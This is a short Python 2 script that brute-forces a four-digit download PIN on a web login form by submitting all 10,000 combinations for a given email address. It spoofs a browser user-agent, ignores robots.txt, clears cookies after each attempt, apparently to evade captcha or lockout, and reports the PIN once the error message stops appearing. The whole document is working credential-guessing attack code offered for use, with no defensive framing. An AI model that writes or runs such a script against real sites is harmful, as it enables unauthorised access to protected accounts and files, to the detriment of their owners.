import mechanize
import cookielib
import itertools
from bs4 import BeautifulSoup


# Browser
br = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

# Browser options
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Follows refresh 0 but not hangs on refresh > 0
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

# Want debugging messages?
#br.set_debug_http(True)
#br.set_debug_redirects(True)
#br.set_debug_responses(True)

# User-Agent (this is cheating, ok?)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


combinations = itertools.product('0123456789',repeat=4)

response = br.open("**URL**")

for x in combinations:

	br.select_form(nr=0) 

	br.form['DownloadLoginForm[email]'] = 'your@email.com'
	br.form['DownloadLoginForm[download_pin]'] = ''.join(x)
	br.method = "POST"

	print "Checking ",br.form['DownloadLoginForm[download_pin]']
	
	response = br.submit()
	print  response.code
	print response.geturl() #url to which the page has redirected after login
	soup = BeautifulSoup(response.read(), 'html.parser')
	error = soup.find("div", {"class": "errorMessage"})
	captcha = soup.find(id="yw0")
	print error
	print captcha
	cj.clear()

	if error is None:
		print "Correct password is ",''.join(x)
		break